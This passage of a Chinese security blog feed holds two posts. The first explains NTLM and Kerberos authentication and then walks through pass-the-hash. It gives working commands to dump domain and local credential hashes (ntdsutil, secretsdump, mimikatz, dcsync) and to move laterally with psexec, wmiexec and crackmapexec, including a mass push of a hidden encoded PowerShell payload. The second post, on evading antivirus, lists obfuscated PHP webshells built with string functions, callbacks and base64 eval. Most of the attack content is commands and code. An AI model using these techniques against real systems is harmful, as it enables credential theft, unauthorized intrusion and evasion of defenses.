class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> C:\Windows\System32\config 的目录</span><br><span class="line"></span><br><span class="line">2020&#x2F;12&#x2F;06  18:18    &lt;DIR&gt;          .</span><br><span class="line">2020&#x2F;12&#x2F;06  18:18    &lt;DIR&gt;          ..</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04           524,288 BBI</span><br><span class="line">2020&#x2F;12&#x2F;05  10:59            28,672 BCD-Template</span><br><span class="line">2020&#x2F;12&#x2F;06  18:18        29,097,984 COMPONENTS</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04           524,288 DEFAULT</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04         3,932,160 DRIVERS</span><br><span class="line">2020&#x2F;12&#x2F;05  11:00            32,768 ELAM</span><br><span class="line">2019&#x2F;03&#x2F;19  10:46    &lt;DIR&gt;          Journal</span><br><span class="line">2019&#x2F;03&#x2F;19  10:46    &lt;DIR&gt;          RegBack</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04            65,536 SAM</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04            32,768 SECURITY</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04        46,661,632 SOFTWARE</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04        10,485,760 SYSTEM</span><br><span class="line">2019&#x2F;03&#x2F;19  10:46    &lt;DIR&gt;          systemprofile</span><br><span class="line">2020&#x2F;12&#x2F;05  11:00    &lt;DIR&gt;          TxR</span><br><span class="line">              10 个文件     91,385,856 字节</span><br><span class="line">               6 个目录 44,029,734,912 可用字节</span><br></pre></td></tr></table></figure><p>NTLM哈希</p><p>单向哈希算法，Windows将用户的密码计算成NTLM哈希之后才存储在电脑中。</p><p>大致的运算流程为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户密码-&gt;HEX编码-&gt;Unicode编码-&gt;MD4</span><br></pre></td></tr></table></figure><p>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对。</p><h3 id="网络认证-Net-NTLM"><a href="#网络认证-Net-NTLM" class="headerlink" title="网络认证 Net NTLM"></a>网络认证 Net NTLM</h3><h4 id="工作组中"><a href="#工作组中" class="headerlink" title="工作组中"></a>工作组中</h4><p>在工作组环境中，要进行文件共享，需要使用smb协议，smb协议一般使用的端口为139,445。</p><p>早期SMB协议在网络上传输明文口令。后来出现LAN Manager Challenge/Response 验证机制，简称LM，后来微软提出了 WindowsNT 挑战/响应验证机制,称之为NTLM。</p><p>NTLM协议的认证过程分为三步：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">协商</span><br><span class="line">质询</span><br><span class="line">验证</span><br></pre></td></tr></table></figure><p>协商：双方确定使用的协议版本，NTLM存在V1和V2两个版本</p><p>质询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.客户端向服务器端发送用户信息(用户名)请求</span><br><span class="line"></span><br><span class="line">2.服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数，被称之为“Challenge”， 然后使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1保存在内存中。同时，生成Challenge1后，将Challenge(16位随机字符)发送给客户端。即Challenge1保存在当前机器，Challenge发送给客户端。</span><br><span class="line"></span><br><span class="line">3.客户端接受到Challenge后，使用自己提供的账户的密码转换成对应的NTLM Hash，然后使用这个NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</span><br><span class="line">4.服务端收到客户端发送的Response后，与之前保存在内存中的Challenge1比较，如果相等认证通过。</span><br></pre></td></tr></table></figure><p>所以对Challenge进行加密都要使用对应用户名的<code>NTLM Hash</code>。加密后的结果称之为Net NTLM Hash。</p><p>关键点：</p><p>客户端发送的是NTLM哈希值与随机字符串加密的结果，而这个NTLM哈希是由用户输入的密码本地计算得出的，所以在这个步骤中，只要能提供正确的NTLM哈希即使不知道正确的密码也可通过认证。</p><h4 id="域环境中"><a href="#域环境中" class="headerlink" title="域环境中"></a>域环境中</h4><p>域环境中检验过程在域控制器中，主要区别就是通过比较 Net-NTLM Hash(基于NTLM Hash生成)的结果来比较NTML Hash是否正确。</p><h3 id="域认证（Kerberos）"><a href="#域认证（Kerberos）" class="headerlink" title="域认证（Kerberos）"></a>域认证（Kerberos）</h3><p>域内认证即采用了Kerberos协议的认证机制，与前两者相比最大的区别是有个一个可信的第三方机构KDC的参与。</p><p>域认证的三个角色：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client</span><br><span class="line">Server</span><br><span class="line">KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</span><br></pre></td></tr></table></figure><p>KDC，密钥分发中心(AS和TGS组成),默认安装在域控中。</p><p>AS，身份认证服务器，根据用户名提取NTLM Hash做为AS生成的<code>CLIENT 密钥</code>，也就是说给client提供密钥，并且返回由<code>CLIENT密钥</code> 加密的<code>CLIENT/TGS SESSIONKEY</code>以及<code>GS密钥</code> 加密的<code>TGT(TICKET-GRANTING-TICKET)</code>。</p><p>TGS，票据授权服务器。</p><p>AD，全称叫account database，存储域中所有用户的用户名和对应的NTLM Hash，可以理解为域中的SAM数据库。</p><p>基础概念</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">票据（Ticket）：是网络对象互相访问的凭证。</span><br><span class="line">TGT（Ticket Granting Ticket）：用来生成Ticket的Ticket。</span><br><span class="line">KDC负责管理票据、认证票据、分发票据。</span><br><span class="line">KDC组成：</span><br><span class="line">Authentication Service: 简称AS，为Client生成TGT的服务，也用来完成对Client的身份验证。</span><br><span class="line">Ticket Granting Service: 为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访问对应的服务</span><br></pre></td></tr></table></figure><p>认证流程：</p><p>1、客户端向KDC中的AS发送一个Authenticatior1，Authenticatior1由当前请求用户使用自身密码的哈希对时间戳、Client ID、网络地址、解密类型等内容进行加密。</p><p>2、AS接收到请求之后，会判断当前请求用户是否可以登录，KDC中存储当前环境中所有用户密码的hash,之后返回给Client由客户端用户对应的hash进行加密的Sessionkey-as和TGT，TGT是由KRBTGT HASH加密的Sessionkey-as和时间戳等信息。</p><p>Sessionkey-as是由客户端的Hash加密的，TGT是由KRBTGT HASH加密的。</p><p>3、客户端收到Sessionkey-as和TGT，可以使用自身的Hash对Sessionkey-as进行解密，但是不可以对TGT进行解密，客户端向TGS发送内容为用sessionkey-as加密的时间戳Authenticator2和票据TGT来获取能够访问Server的票据。</p><p>4、TGS收到Authenticator2和票据TGT之后，检察当前是否存在客户端请求的服务，如果存在则使用KRBTGT密码解密TGT拿到Sessionkey-as。验证成功之后将sessionkey-as加密的Sessionkey-tgs和票据ST(Server密码Hash加密的Sessionkey-tgs)发送给Client。</p><p>5、Client收到Sessionkey-as加密的sessionkey-tgs和票据(Server密码Hash加密的sessionkey-tgs)之后用sessionkey-as解密得到的sessionkey-tgs,然后把内容为Sessionkey-tgs加密的时间戳Authenticator3和票据ST一起发送给Server。</p><p>6、Server通过自己的密码解密票据ST,得到sessionkey-tgs，再用sessionkey-tgs解密Authenticator3得到时间戳，验证正确返回验证成功</p><h2 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h2><h3 id="Windows密码和哈希的获取"><a href="#Windows密码和哈希的获取" class="headerlink" title="Windows密码和哈希的获取"></a>Windows密码和哈希的获取</h3><p>目的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">远程登录目标机器，并为了哈希传递和票据攻击做基础。</span><br></pre></td></tr></table></figure><h4 id="获取域内所有用户hash"><a href="#获取域内所有用户hash" class="headerlink" title="获取域内所有用户hash"></a>获取域内所有用户hash</h4><h5 id="登录域控制器获取hash"><a href="#登录域控制器获取hash" class="headerlink" title="登录域控制器获取hash"></a>登录域控制器获取hash</h5><p>域内所有用户的凭据信息(hash)存储在域控制器中的c:\windows\ntds\ntds.dit中。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201209111511447.png" alt="image-20201209111511447"></p><p>sam文件存储着当前主机用户的密码信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit</span><br><span class="line">system文件位置:C:\Windows\System32\config\SYSTEM</span><br><span class="line">sam文件位置:C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure><p>想要破解sam文件与ntds.dit文件都需要拥有一个system文件。</p><p>创建快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil: snapshot</span><br><span class="line">快照: activate instance ntds</span><br><span class="line">使用中執行個體已設定為 &quot;ntds&quot;。</span><br><span class="line">快照: create</span><br><span class="line">正在建立快照...</span><br><span class="line">快照集 &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae69&#125; 已經成功產生。</span><br><span class="line">快照: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure><p>挂载快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;ntdsutil snapshot &quot;mount &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae</span><br><span class="line">69&#125;&quot; quit quit</span><br><span class="line">ntdsutil: snapshot</span><br><span class="line">快照: mount &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae69&#125;</span><br><span class="line">快照 &#123;3f3a24b3-ce4f-4096-852a-0b3864a8909d&#125; 已掛接為 C:\$SNAP_202012062103_VOLUM</span><br><span class="line">EC$\</span><br><span class="line">快照: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure><p>复制<code>ntds.dit</code>到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;copy C:\$SNAP_202012062103_VOLUMEC$\Windows\NTDS\ntds.dit c:</span><br><span class="line">\ntds.dit</span><br><span class="line">複製了         1 個檔案。</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><p>解除挂载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae</span><br><span class="line">69&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>删除快照：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;delete &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae</span><br><span class="line">69&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>然后通过注册表的方式获取KEY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\system.hiv</span><br></pre></td></tr></table></figure><p>然后开始解密</p><p>本地使用<code>secretsdump.py</code>，导出hash。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -ntds ntds.dit -system sys.hiv LOCAL</span><br></pre></td></tr></table></figure><p>导出来之后的文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STPC-24$:7823:aad3b435b51404eeaad3b435b51404ee:a5522abc1d8a4901f7be863ea7f5d5d6:::</span><br><span class="line">STPC-35$:12126:aad3b435b51404eeaad3b435b51404ee:cfd2cbe90a73cc1da1dfcd281312134e:::</span><br><span class="line">STPC-15$:11125:aad3b435b51404eeaad3b435b51404ee:db561df3e26ab8dd270d138c74cc7485:::</span><br><span class="line">3060-4B$:15133:aad3b435b51404eeaad3b435b51404ee:ecd695ea2a81472caad57d3b77e7292a:::</span><br></pre></td></tr></table></figure><p>破解出的密码格式为<code>domain\uid:rid:lmhash:nthash</code>。</p><h5 id="迷你卡姿获取"><a href="#迷你卡姿获取" class="headerlink" title="迷你卡姿获取"></a>迷你卡姿获取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:test.local &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure><h5 id="CS获取"><a href="#CS获取" class="headerlink" title="CS获取"></a>CS获取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.查询域内所有hash</span><br><span class="line">    dcsync [DOMAIN.FQDN]</span><br><span class="line">2.查询指定用户hash</span><br><span class="line">    dcsync [DOMAIN.FQDN] [DOMAIN\user]</span><br></pre></td></tr></table></figure><h4 id="获取本机用户hash"><a href="#获取本机用户hash" class="headerlink" title="获取本机用户hash"></a>获取本机用户hash</h4><h5 id="读取lsass进程的信息"><a href="#读取lsass进程的信息" class="headerlink" title="读取lsass进程的信息"></a>读取lsass进程的信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure><h5 id="读取SAM数据库"><a href="#读取SAM数据库" class="headerlink" title="读取SAM数据库"></a>读取SAM数据库</h5><p>获取用户Hash,获取系统所有本地用户的hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h5 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br></pre></td></tr></table></figure><h5 id="转储lsass进程离线获取hash"><a href="#转储lsass进程离线获取hash" class="headerlink" title="转储lsass进程离线获取hash"></a>转储lsass进程离线获取hash</h5><p>找到lsass进程,然后创建转储文件-&gt;将该文件下载回来放置在Mimikatz的同目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h3 id="Hash传递方式"><a href="#Hash传递方式" class="headerlink" title="Hash传递方式"></a>Hash传递方式</h3><p>哈希传递需要配合445,135,139,5985 (http) 或 5986(https) 这四个端口的服务来进行的。</p><h4 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:852a844adfce18f66009b4f14e0a98de</span><br></pre></td></tr></table></figure><h4 id="impacket套装"><a href="#impacket套装" class="headerlink" title="impacket套装"></a>impacket套装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py  administrator@10.73.147.29   -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de administrator@10.73.147.29</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py administrator@10.10.10.3 -hashes :a9398c8a95dbe6801f280d2cfb9c76de</span><br></pre></td></tr></table></figure><p>smbexec可以通过文件共享在运程系统中执行命令。对方主机需要开启 <strong><em>\</em>c$**</strong> 共享，依赖于<strong>445</strong>端口。</p><p>注意这里的用户名和hash还有ip一定要对应起来。</p><h3 id="pth批量横向移动"><a href="#pth批量横向移动" class="headerlink" title="pth批量横向移动"></a>pth批量横向移动</h3><p>批量哈希传递</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  cme python3 crackmapexec smb 10.10.10.0&#x2F;24 -u administrator -H a9398c8a95dbe6801f280d2cfb9c76de</span><br></pre></td></tr></table></figure><p>批量上马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 10.211.55.51  10.211.55.52 -u administrator  -H 852a844adfce18f66009b4f14e0a98de -x &quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网渗透–横向纵横1&quot;&gt;&lt;a href=&quot;#内网渗透–横向纵横1&quot; class=&quot;headerlink&quot; title=&quot;内网渗透–横向纵横1&quot;&gt;&lt;/a&gt;内网渗透–横向纵横1&lt;/h1&gt;&lt;p&gt;哈希传递（PTH）票据传递（PTT）委派攻击等，都是基于域环境下的认证机制来</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--免杀总结</title>
    <link href="http://s1eady.top/2020/11/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/"/>
    <id>http://s1eady.top/2020/11/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</id>
    <published>2020-11-30T03:01:14.000Z</published>
    <updated>2020-11-30T03:51:09.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试–免杀总结"><a href="#渗透测试–免杀总结" class="headerlink" title="渗透测试–免杀总结"></a>渗透测试–免杀总结</h1><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string,start,length)</span><br></pre></td></tr></table></figure><p>substr() 函数返回字符串的一部分。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要返回其中一部分的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">必需。规定在字符串的何处开始。<strong>正数</strong> - 在字符串的指定位置开始; <strong>负数</strong> - 在从字符串结尾开始的指定位置开始; <strong>0</strong> - 在字符串中的第一个字符处开始</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定被返回字符串的长度。默认是直到字符串的结尾。<strong>正数</strong> - 从 <em>start</em> 参数所在的位置返回的长度; <strong>负数</strong> - 从字符串末端返回的长度</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a = substr(<span class="string">&#x27;1a&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;e&#x27;</span>.<span class="string">&#x27;r&#x27;</span>.<span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">    $a($_POST[<span class="string">&#x27;good&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="strtr"><a href="#strtr" class="headerlink" title="strtr()"></a>strtr()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strtr(string,from,to)</span><br></pre></td></tr></table></figure><p>strtr() 函数转换字符串中特定的字符。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要转换的字符串。</td></tr><tr><td align="left"><em>from</em></td><td align="left">必需（除非使用数组）。规定要改变的字符。</td></tr><tr><td align="left"><em>to</em></td><td align="left">必需（除非使用数组）。规定要改变为的字符。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需（除非使用 <em>from</em> 和 <em>to</em>）。数组，其中的键名是更改的原始字符，键值是更改的目标字符。</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $a &#x3D; strtr(&#39;asdfgt&#39;,&#39;sdfg&#39;,&#39;sser&#39;);</span><br><span class="line">    $a($_POST[&#39;good&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="substr-replace"><a href="#substr-replace" class="headerlink" title="substr_replace()"></a>substr_replace()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr_replace(string,replacement,start,length)</span><br></pre></td></tr></table></figure><p>substr_replace() 函数把字符串 string 的一部分替换为另一个字符串 replacement。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要检查的字符串。</td></tr><tr><td align="left"><em>replacement</em></td><td align="left">必需。规定要插入的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">必需。规定在字符串的何处开始替换。<strong>正数</strong> - 在字符串中的指定位置开始替换; <strong>负数</strong> - 在从字符串结尾的指定位置开始替换; <strong>0</strong> - 在字符串中的第一个字符处开始替换</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定要替换多少个字符。默认是与字符串长度相同。<strong>正数</strong> - 被替换的字符串长度; <strong>负数</strong> - 表示待替换的子字符串结尾处距离 <em>string</em> 末端的字符个数。<strong>0</strong> - 插入而非替换</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $a &#x3D; substr_replace(&quot;assdfg&quot;,&quot;sert&quot;,2);</span><br><span class="line">    $a($_POST[&#39;good&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要检查的字符串。</td></tr><tr><td align="left"><em>charlist</em></td><td align="left">可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符 <code>\0</code> - NULL; <code>\t</code> - 制表符; <code>\n</code> - 换行; <code>\x0B</code> - 垂直制表符; <code>\r</code> - 回车; <strong>空格</strong></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $a &#x3D; trim(&#39; assert &#39;);</span><br><span class="line">    $a($_POST[&#39;good&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><p>字符串逆序</p><h2 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h2><h3 id="array-walk"><a href="#array-walk" class="headerlink" title="array_walk()"></a>array_walk()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk(array,myfunction,parameter...)</span><br></pre></td></tr></table></figure><p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">必需。规定数组。</td></tr><tr><td align="left"><em>myfunction</em></td><td align="left">必需。用户自定义函数的名称。</td></tr><tr><td align="left"><em>userdata</em>,…</td><td align="left">可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function good($value,$key)</span><br><span class="line">    &#123;   </span><br><span class="line">        $x &#x3D; $key.$value;</span><br><span class="line">        $x($_POST[&#39;x&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line">    $a&#x3D;array(&quot;ass&quot;&#x3D;&gt;&quot;ert&quot;);</span><br><span class="line">    array_walk($a,&quot;good&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function(string parameter, string code)</span><br></pre></td></tr></table></figure><p>它会将第二个字符串参数当做代码来执行，导致webshell的形成。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$function = </span><br><span class="line">create_function(<span class="string">&#x27;$code&#x27;</span>,strrev(<span class="string">&#x27;lave&#x27;</span>).<span class="string">&#x27;(&#x27;</span>.strrev(<span class="string">&#x27;TEG_$&#x27;</span>).<span class="string">&#x27;[&quot;code&quot;]);&#x27;</span>);$function(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = create_function(<span class="string">&#x27;$code&#x27;</span>,base64_decode(<span class="string">&#x27;ZXZhbCgkX0dFVFsidGVzdCJdKTs=&#x27;</span>));</span><br><span class="line">$function(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h2><p>变量的引用与可变变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量引用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="number">1</span>];</span><br><span class="line">$b = &amp;$a;</span><br><span 